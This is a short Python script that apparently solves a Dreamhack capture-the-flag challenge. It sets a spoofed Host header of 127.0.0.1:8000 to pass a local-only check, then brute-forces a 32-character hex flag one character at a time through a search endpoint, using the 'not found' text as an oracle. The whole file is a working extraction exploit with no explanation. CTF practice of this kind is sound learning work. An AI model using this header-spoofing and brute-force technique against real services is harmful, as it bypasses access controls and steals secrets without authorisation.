import requests
from tqdm import tqdm


def check_response(flag):
    url_candidate = 'http://host3.dreamhack.games:21988/search?query='+flag

    headers = {
        'HOST': '127.0.0.1:8000'
    }
    response = requests.get(url_candidate, headers=headers)
    return response.text


if __name__ == "__main__":
    flag = ''
    for i in range(32):
        for char in '0123456789abcdef':
            response_txt = check_response(flag+char)
            print(flag+char)
            if 'not found' not in response_txt:
                print(response_txt)
                flag = flag + char
